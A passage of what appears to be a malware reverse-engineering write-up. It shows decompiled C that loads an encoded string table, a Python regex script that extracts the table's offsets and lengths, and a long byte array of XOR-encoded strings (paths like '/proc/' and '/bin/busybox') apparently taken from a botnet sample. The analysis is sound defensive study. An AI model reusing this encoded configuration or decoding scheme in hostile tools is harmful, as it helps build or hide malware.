&amp;asc_8058C60[61], 4);</span></span><br><span class="line"><span class="string">dword_805A1E8 = (int)v7;</span></span><br><span class="line"><span class="string">word_805A1EC = 4;</span></span><br><span class="line"><span class="string">v8 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v8, &amp;asc_8058C60[66], 7);</span></span><br><span class="line"><span class="string">dword_805A1F0 = (int)v8;</span></span><br><span class="line"><span class="string">word_805A1F4 = 7;</span></span><br><span class="line"><span class="string">v9 = sub_8056AC4(8u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v9, &amp;asc_8058C60[74], 8);</span></span><br><span class="line"><span class="string">dword_805A1F8 = (int)v9;</span></span><br><span class="line"><span class="string">word_805A1FC = 8;</span></span><br><span class="line"><span class="string">v10 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v10, &amp;asc_8058C60[83], 10);</span></span><br><span class="line"><span class="string">dword_805A200 = (int)v10;</span></span><br><span class="line"><span class="string">word_805A204 = 10;</span></span><br><span class="line"><span class="string">v11 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v11, &amp;asc_8058C60[94], 11);</span></span><br><span class="line"><span class="string">dword_805A208 = (int)v11;</span></span><br><span class="line"><span class="string">word_805A20C = 11;</span></span><br><span class="line"><span class="string">v12 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v12, &amp;asc_8058C60[106], 15);</span></span><br><span class="line"><span class="string">dword_805A210 = (int)v12;</span></span><br><span class="line"><span class="string">word_805A214 = 15;</span></span><br><span class="line"><span class="string">v13 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v13, &amp;asc_8058C60[122], 16);</span></span><br><span class="line"><span class="string">dword_805A218 = (int)v13;</span></span><br><span class="line"><span class="string">word_805A21C = 16;</span></span><br><span class="line"><span class="string">v14 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v14, &amp;asc_8058C60[139], 14);</span></span><br><span class="line"><span class="string">dword_805A220 = (int)v14;</span></span><br><span class="line"><span class="string">word_805A224 = 14;</span></span><br><span class="line"><span class="string">v15 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v15, &amp;asc_8058C60[154], 11);</span></span><br><span class="line"><span class="string">dword_805A228 = (int)v15;</span></span><br><span class="line"><span class="string">word_805A22C = 11;</span></span><br><span class="line"><span class="string">v16 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v16, &amp;asc_8058C60[166], 5);</span></span><br><span class="line"><span class="string">dword_805A230 = (int)v16;</span></span><br><span class="line"><span class="string">word_805A234 = 5;</span></span><br><span class="line"><span class="string">v17 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v17, &amp;asc_8058C60[172], 5);</span></span><br><span class="line"><span class="string">dword_805A238 = (int)v17;</span></span><br><span class="line"><span class="string">word_805A23C = 5;</span></span><br><span class="line"><span class="string">v18 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v18, &amp;asc_8058C60[178], 16);</span></span><br><span class="line"><span class="string">dword_805A250 = (int)v18;</span></span><br><span class="line"><span class="string">word_805A254 = 16;</span></span><br><span class="line"><span class="string">v19 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v19, &amp;asc_8058C60[195], 14);</span></span><br><span class="line"><span class="string">dword_805A258 = (int)v19;</span></span><br><span class="line"><span class="string">word_805A25C = 14;</span></span><br><span class="line"><span class="string">v20 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v20, &amp;asc_8058C60[210], 9);</span></span><br><span class="line"><span class="string">dword_805A260 = (int)v20;</span></span><br><span class="line"><span class="string">word_805A264 = 9;</span></span><br><span class="line"><span class="string">v21 = sub_8056AC4(0x13u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v21, &amp;asc_8058C60[220], 19);</span></span><br><span class="line"><span class="string">dword_805A268 = (int)v21;</span></span><br><span class="line"><span class="string">word_805A26C = 19;</span></span><br><span class="line"><span class="string">v22 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v22, &amp;asc_8058C60[240], 23);</span></span><br><span class="line"><span class="string">dword_805A270 = (int)v22;</span></span><br><span class="line"><span class="string">word_805A274 = 23;</span></span><br><span class="line"><span class="string">v23 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v23, &amp;asc_8058C60[264], 14);</span></span><br><span class="line"><span class="string">dword_805A278 = (int)v23;</span></span><br><span class="line"><span class="string">word_805A27C = 14;</span></span><br><span class="line"><span class="string">v24 = sub_8056AC4(0x13u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v24, &amp;asc_8058C60[279], 19);</span></span><br><span class="line"><span class="string">dword_805A280 = (int)v24;</span></span><br><span class="line"><span class="string">word_805A284 = 19;</span></span><br><span class="line"><span class="string">v25 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v25, &amp;asc_8058C60[299], 23);</span></span><br><span class="line"><span class="string">dword_805A288 = (int)v25;</span></span><br><span class="line"><span class="string">word_805A28C = 23;</span></span><br><span class="line"><span class="string">v26 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v26, &amp;asc_8058C60[323], 15);</span></span><br><span class="line"><span class="string">dword_805A290 = (int)v26;</span></span><br><span class="line"><span class="string">word_805A294 = 15;</span></span><br><span class="line"><span class="string">v27 = sub_8056AC4(8u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v27, &amp;asc_8058C60[339], 8);</span></span><br><span class="line"><span class="string">dword_805A298 = (int)v27;</span></span><br><span class="line"><span class="string">word_805A29C = 8;</span></span><br><span class="line"><span class="string">v28 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v28, &amp;asc_8058C60[348], 11);</span></span><br><span class="line"><span class="string">dword_805A2A0 = (int)v28;</span></span><br><span class="line"><span class="string">word_805A2A4 = 11;</span></span><br><span class="line"><span class="string">v29 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v29, &amp;asc_8058C60[360], 9);</span></span><br><span class="line"><span class="string">dword_805A2A8 = (int)v29;</span></span><br><span class="line"><span class="string">word_805A2AC = 9;</span></span><br><span class="line"><span class="string">v30 = sub_8056AC4(6u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v30, &amp;asc_8058C60[370], 6);</span></span><br><span class="line"><span class="string">dword_805A2B0 = (int)v30;</span></span><br><span class="line"><span class="string">word_805A2B4 = 6;</span></span><br><span class="line"><span class="string">v31 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v31, &amp;asc_8058C60[377], 5);</span></span><br><span class="line"><span class="string">dword_805A2B8 = (int)v31;</span></span><br><span class="line"><span class="string">word_805A2BC = 5;</span></span><br><span class="line"><span class="string">v32 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v32, &amp;asc_8058C60[383], 10);</span></span><br><span class="line"><span class="string">dword_805A2C8 = (int)v32;</span></span><br><span class="line"><span class="string">word_805A2CC = 10;</span></span><br><span class="line"><span class="string">v33 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v33, &amp;asc_8058C60[394], 15);</span></span><br><span class="line"><span class="string">dword_805A2D0 = (int)v33;</span></span><br><span class="line"><span class="string">word_805A2D4 = 15;</span></span><br><span class="line"><span class="string">v34 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v34, &amp;asc_8058C60[411], 10);</span></span><br><span class="line"><span class="string">dword_805A2D8 = (int)v34;</span></span><br><span class="line"><span class="string">word_805A2DC = 10;</span></span><br><span class="line"><span class="string">v35 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v35, &amp;asc_8058C60[422], 5);</span></span><br><span class="line"><span class="string">dword_805A2E0 = (int)v35;</span></span><br><span class="line"><span class="string">word_805A2E4 = 5;</span></span><br><span class="line"><span class="string">v36 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v36, &amp;asc_8058C60[428], 5);</span></span><br><span class="line"><span class="string">dword_805A2E8 = (int)v36;</span></span><br><span class="line"><span class="string">word_805A2EC = 5;</span></span><br><span class="line"><span class="string">v37 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v37, &amp;asc_8058C60[434], 5);</span></span><br><span class="line"><span class="string">dword_805A2F0 = (int)v37;</span></span><br><span class="line"><span class="string">word_805A2F4 = 5;</span></span><br><span class="line"><span class="string">v38 = sub_8056AC4(6u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v38, &amp;asc_8058C60[440], 6);</span></span><br><span class="line"><span class="string">dword_805A308 = (int)v38;</span></span><br><span class="line"><span class="string">word_805A30C = 6;</span></span><br><span class="line"><span class="string">v39 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v39, &amp;asc_8058C60[447], 7);</span></span><br><span class="line"><span class="string">dword_805A310 = (int)v39;</span></span><br><span class="line"><span class="string">word_805A314 = 7;</span></span><br><span class="line"><span class="string">v40 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v40, &amp;asc_8058C60[455], 7);</span></span><br><span class="line"><span class="string">dword_805A318 = (int)v40;</span></span><br><span class="line"><span class="string">word_805A31C = 7;</span></span><br><span class="line"><span class="string">v41 = sub_8056AC4(3u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v41, &amp;asc_8058C60[463], 3);</span></span><br><span class="line"><span class="string">dword_805A320 = (int)v41;</span></span><br><span class="line"><span class="string">word_805A324 = 3;</span></span><br><span class="line"><span class="string">v42 = sub_8056AC4(0x12u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v42, &amp;asc_8058C60[467], 18);</span></span><br><span class="line"><span class="string">dword_805A328 = (int)v42;</span></span><br><span class="line"><span class="string">word_805A32C = 18;</span></span><br><span class="line"><span class="string">v43 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v43, &amp;asc_8058C60[486], 23);</span></span><br><span class="line"><span class="string">dword_805A330 = (int)v43;</span></span><br><span class="line"><span class="string">word_805A334 = 23;</span></span><br><span class="line"><span class="string">v44 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v44, &amp;asc_8058C60[510], 9);</span></span><br><span class="line"><span class="string">dword_805A338 = (int)v44;</span></span><br><span class="line"><span class="string">word_805A33C = 9;</span></span><br><span class="line"><span class="string">v45 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v45, &amp;asc_8058C60[520], 16);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">list1 = re.findall(<span class="string">&quot;asc_8058C60\[([\d]+)\]&quot;</span>, raw)</span><br><span class="line">list2 = re.findall(<span class="string">&quot;, (\d+)\);\n&quot;</span>, raw)</span><br><span class="line">list_tmp = [<span class="string">&quot;0&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> list1:</span><br><span class="line">list_tmp.append(_)</span><br><span class="line">list1 = list_tmp</span><br><span class="line"></span><br><span class="line">cipher1 = [</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x0C</span>, <span class="number">0x41</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xB7</span>, <span class="number">0x00</span>, <span class="number">0x4E</span>, </span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x02</span>, <span class="number">0x44</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x5A</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x44</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x70</span>, </span><br><span class="line"><span class="number">0x14</span>, <span class="number">0x1B</span>, <span class="number">0x5A</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, </span><br><span class="line"><span class="number">0x71</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x70</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x70</span>, <span class="number">0x46</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x51</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x1B</span>, <span class="number">0x6B</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x16</span>, <span class="number">0x77</span>, </span><br><span class="line"><span class="number">0x6B</span>, <span class="number">0x77</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0x57</span>, <span class="number">0x7B</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0x53</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x16</span>, <span class="number">0x64</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x6D</span>, <span class="number">0x6F</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x0C</span>, <span class="number">0x46</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x0C</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x4E</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x13</span>, <span class="number">0x43</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x16</span>, <span class="number">0x46</span>, <span class="number">0x4F</span>, <span class="number">0x4D</span>, <span class="number">0x11</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x52</span>, <span class="number">0x10</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0x49</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x4F</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x13</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x7D</span>, <span class="number">0x55</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x0D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, </span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x6B</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x67</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x6E</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x76</span>, <span class="number">0x69</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x67</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x1A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x54</span>, <span class="number">0x79</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x11</span>, <span class="number">0x6D</span>, <span class="number">0x44</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, <span class="number">0x78</span>, </span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x58</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x4A</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x75</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x16</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x64</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x60</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x40</span>, </span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x54</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, </span><br><span class="line"><span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x73</span>, <span class="number">0x57</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, <span class="number">0x0C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x43</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x0F</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x4D</span>, <span class="number">0x49</span>, <span class="number">0x4B</span>, <span 